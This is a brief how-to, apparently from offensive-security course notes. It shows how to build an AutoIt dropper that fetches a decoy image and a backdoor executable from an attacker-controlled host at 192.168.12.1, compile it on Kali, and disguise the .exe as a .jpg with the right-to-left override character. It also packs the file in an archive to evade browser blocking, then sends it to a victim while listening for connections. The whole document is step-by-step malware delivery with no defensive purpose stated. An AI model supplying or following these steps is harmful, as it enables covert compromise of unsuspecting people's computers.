Open the autoit file.
At the local urls set as much urls as you want and seperate them by an coma
This link need to be available online on direct link,for example:
Local $urls = "https://www.timeoutdubai.com/cloud/timeoutdubai/2021/09/19/9gLQb21w-Bla-Bla-1200x800.jpg, http://192.168.12.1/Evil-files/8080.exe"

If you want to download more backdoors/Evil files just add another coma
Now change the file type from .txt to .au3
Now on kali search for a program called Compile, it will compile autoit scripts for us.
The first thing it asks is the source aka the file we made.
and now if desigred set an icon.

But it still has .exe, this isnt regular. luckly there is a way to change it, we can make it look like anything else.
First, for example we want an exe file as jpg, Open a notepad and type your file name like this:
imaggpj.exe
image(name of file)jpg(desigred type).exe

So how to do it?
We need to put RTL character after the file name, anything that comes after that will be reversed.
To get that character search on Kali characters, Search right to left overwrite.
Now copy and paste it after the file name and the output will show as:
imagexe.jpg

Now rename our exe back door with the new name, some new browsers are blocking the rtl.
In order to fix that we have to compress the file and add it to an archive.
And thats it! We are all down, Listen to incoming connections and send the file!
